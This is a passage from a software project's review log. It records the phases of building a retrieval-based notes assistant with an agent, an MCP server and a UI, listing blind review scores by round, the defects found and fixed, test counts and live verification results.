- exact-path TOAST cost;
- sanitizer behavior against a real GFM renderer.

**Conclusion:** more paper rounds would keep producing 0.1–0.3-point gains. The credible route to 9+ is the M0 risk spikes: real SQL and tests for roles/RLS, `claim_jobs` fencing, `search_vectors` plans, the FencedPostgresSaver contract, and the sanitizer fuzzer. Then a reviewer can be shown *passing tests* instead of prose.

---
---

# Phase 0 code reviews (blind, against the running code)

| Round | Score | Key findings fixed |
|---|---|---|
| 1 | 7.0 | Ports couldn't join the caller's transaction; ChatModel lacked tool calls and usage; no frozen ID derivation; per-schema default-privilege REVOKE was a no-op (functions were PUBLIC-executable); single-column `jobs.connector_id` FK; applied placeholder slots skipped silently; brittle `extra=forbid` responses; missing E schemas; 500s lost request-id; BaseHTTPMiddleware |
| 2 | 7.5 | Missing seam ports (DocumentIndex, AgentRunner, ConversationRuns, SecretBox); extras not actually installed; duplicate function ownership; no catalog-wide invariant tests; plaintext role passwords in DDL; tenant delete blocked; self-deleting delete_connector job; checksums recorded outside the migration transaction |
| 3 | 8.0 | Embedding inside a locked transaction (idle-timeout death spiral); one embedder for all spaces; str vs bytes SHAs; run-lease release without tenant; non-unique tool-call ids could auto-approve; closed response enums; grant gaps; root-owned uploads volume |
| 4 | **8.5: approved** | Two D↔E seam ambiguities (who sanitizes; link allow-list source), resolved with `TurnSources` + `OutputSanitizer.allow()`. Pre-emptively added `JobQueue.report_progress`, `Retriever.spaces_for`, and new-conversation ids on interrupt/error events |

Deferred, with owners: CI action SHA pinning (needs repo/network), managed-Postgres bootstrap verification (M9), migrator advisory lock and CONCURRENTLY lock_timeout (Phase 4).

---
---

# Phase 1 module reviews (8 parallel builders, blind principal review per module)

| Module | Review scores (per round) | Final | Open P0/P1 |
|---|---|---|---|
| A: job queue + worker | 8.5 | 8.5 | 0 |
| B: chunker, search, rerank, DocumentIndex | 8 → 8.5 → 9 | 9 | 0 |
| C1: Notion client, rate limiter, normalizer | 8 → 8.5 → 9 | 9 | 0 |
| C2: sync, reconcile, file parsing, blob store | 9 | 9 | 0 |
| D1: LangGraph agent + AgentRunner | 8 → 8 → 8 → 8.5 (targeted fix) | 8.5 | 0 |
| D2: fenced checkpoints, run leases, Ollama chat | 8.5 → 9 | 9 | 0 |
| E1: streaming sanitizer | 5.5 → 8 → 8 → 8 (targeted fix) | 8 | 0 |
| E2: API, auth, provisioning, SDK | 8 → 9 | 9 | 0 |

Whole repo after Phase 1: **966 tests pass**; ruff, mypy --strict (sources and every module's tests) and 6/6 import-linter contracts are green. Open P2s and integration requests are listed in `docs/handoff/*.md` for Phase 2.


## Phase 2a integration (2026-10-16)
Two fresh blind reviewers per round (integration correctness and runtime/ops), none with access to this file.
- Scores by round: 6/5, 7/7, 7.5/7.5, 7.5/7.5, 7.5/8, 8/7.5, **8/8** (round 7: no P0 or P1). Approved.
- Six fix rounds, all done by parallel forks split by file ownership.
- Details and the P2 backlog are in `docs/handoff/PHASE2A.md`.


## Phase 2b: retrieve-then-answer, Gemini, eval, verification guarantee (2026-10-17/18)
One fresh blind principal reviewer per round, none with access to this file.
- **Scores by round:** 7.5, 7.5, 8.0, 8.0, 8.0, 8.0, 7.5, 8.0, 7.5, then the **final round 8.5 (no P0 or P1). Approved and closed.**
- Rounds 2 and 4–9 each found a P1 in the code-quote channel (backticked text matching the page's prose).
  - The owner first narrowed it (round 7), then removed it (round 9).
  - The score converged only after the removal: the right call was to shrink the attack surface, not to keep patching it.
- Measured on the final build (B11, dev): 100% correct, verified 62%, p95 4.9 s, 0 errors. Held-out H2 (B5 build): 85% correct, invented 0% on the owner's attestation.
- Details, per-round fixes and the open P2s are in `docs/NEXT.md`.


## Phase 2c: interview-prep answer shape and labelled extras (ADR-0016), 2026-10-18
One fresh blind principal reviewer per round, none with access to this file.
- **Scores by round:** 7.0, 7.0, 8.0, 7.5, 7.0, then **final 8.0 (no P0 or P1). Closed.**
- **What changed between rounds:**
  - Text-shaping by regex kept breaking: stripping emphasis corrupted identifiers.
  - The design moved to extract-in-the-node and render-literally-at-the-API.
  - A mid-cycle identifier-exactness rule drew five P1s and was reverted rather than patched.
- **Measured** (dev, C7): 100% correct, verified 80%, p95 5.1 s, 0 errors. Extras appeared on about half the turns, and none named a company.
- Details are in `docs/NEXT.md` (Phase 2c).


## Phase 3: MCP server and Streamlit UI (thin API clients, ADR-0005), 2026-10-18
Two parallel builders, each with blind reviews, then integrated and re-reviewed.
- **MCP:** 7.5 → 8.5 → 8.4. **UI:** 8.0 → 8.2 → 8.0.
- **Integrated:** 8.0 (two P1s, fixed) → **8.3 final, no P0 or P1. Closed.**
- Verified live against the real stack and notes:
  - UI: a Verified answer with sources and extras after them, about 4 s; bound to loopback, with Host and Origin checks;
  - MCP over stdio: ask, search, list_sources, and a follow-up.
- Details in `docs/NEXT.md` (Phase 3) and `docs/handoff/{MCP,UI}.md`.


## Phase 3b: interview mode and the false "Not verified" flags (ADR-0015 amended), 2026-10-19
- **A blind DESIGN review before any code:** 6.5, with 4 P0s:
  - a token grammar that admitted `3`, `true` and plain words;
  - a reason mapping that would have muted the measured `exactly_one_v2` typo class;
  - strict response enums;
  - an unpinned exhaustion signal.
  - Specs were fixed and the builders relaunched.
- **Builders** (blind review per module): IV-CORE 8 → 9, FLAG 7.5 → 9, IV-UI 8.2 → 8.7.
- **Integrated:** 8.0, with one P1 (code questions starved) fixed → re-review **8.6, no P0 or P1. Closed.**
- **The guarantee held** against 11 counterexamples. A name can be backed; what the sentence says about it is the verifier's job (documented).
- **Live:** the interview loop on Kafka and Memento; the owner's Memento false flag is gone (3 of 3 verified).


## Phase 3c: interview levels, the general-knowledge fallback, acronyms and dotted names, 2026-10-19
- **Design review before building:** 7.0, with 2 P0s, both fixed in the specs:
  - a shape-only dotted-name rule would have merged sentences; it became source-backed;
  - the general-mode token was optional; it is now required.
- **Builders:** IV3-CORE 8 → 8.9, IV3-UI 8.1 → 9, DOT 7.5 → 8 → 9.
- **Integrated:** 8.0 (the lexical gate was too strict, fixed) → re-review **8.6** (the loose-label regex ate "(S3)", fixed). **No P0 or P1 open. Closed.**
- **Live:** acronyms, levels, the opt-in general mode, the gate, and the `{logger.name}` answer verified.


## ADR-0017 eval layer: design reviews, 2026-10-21
- One principal reviewer, four rounds: **6.5 → 7.8 → 8.0 → approved to build.**
- **What the rounds caught:**
  - missing API seams;
  - a biased verifier set (selection on outcome, free catches);
  - the live corpus;
  - calibration n;
  - identity instability across copies;
  - snapshot pollution of daily use;
  - an unbounded cross-tenant copy function.
- Every finding is mapped in the ADR's review tables.


## ADR-0018 Phase 4 (thin): security pass + observability, 2026-10-22
- **Design review:** 6.5, all decisions written into Revision 2 before building.
- **Builders:** OBS-METRICS 9, OBS-STACK 8.5, SEC-SCAN 9, SEC-THREAT 8.5.
- **Final blind review:** 7.5, ship after fixes. P1s: onnxruntime 1DS telemetry; stdlib/uvicorn logs bypassing redaction; the dead-jobs gauge resetting after archiving; latency/5xx alerts firing on one event.
- **Fix round** (migration 0014, a redacting root handler, count + ratio + volume over 6 h, hosted edge 8 s with the 5 s SLO stated as not met) → re-review **8.5, ship**. Its two P2s (a raw `/` in DSN passwords, a stale Grafana figure) fixed. `make check` 5423 passed.
- **Live:** schema 14, targets up, no alert firing, redacted JSON logs, chat turn verified. **Closed.**


## Phase 5: the write-up, 2026-10-22
- **Design review of the plan (docs/PHASE5.md):** 6 → 8 → approved after Revision 3. It caught: no command for a new user to get a key; new tests outside `make check`'s paths; demo summaries git-ignored; private details in shipped docs.
- **Builders (blind loops):** W0 keys 8.5 → 9, W1 README 8 → 8 → 9, W2 guide 8.5 ×3 (P1 fixed by the integrator), W3 results 8.5, W4 decisions 8 → 9.
- **Integrator:** retrieval tables checked against the embed/rerank models; README headline tables generated by the same exporter (one mechanism); the pre-publish gate `make prepublish` (forbidden paths, token shapes, UUID/home paths in docs, live ids from the DB, private question ids and note titles from the local set); scrubs of home paths, the tenant name, private topics, ids and note titles.
- **Final blind review:** 8 (P1s: an undocumented CI workflow; private ids and note titles left in NEXT.md that the gate could not see; README numbers only from the synthetic set) → fixes → re-check **8.5, ship**; its seven P2s fixed.
- **Not run live:** `make tenant` / `make mcp-key` (they would add a tenant or key to the daily database); covered by the owner's fresh-user run on the checklist.
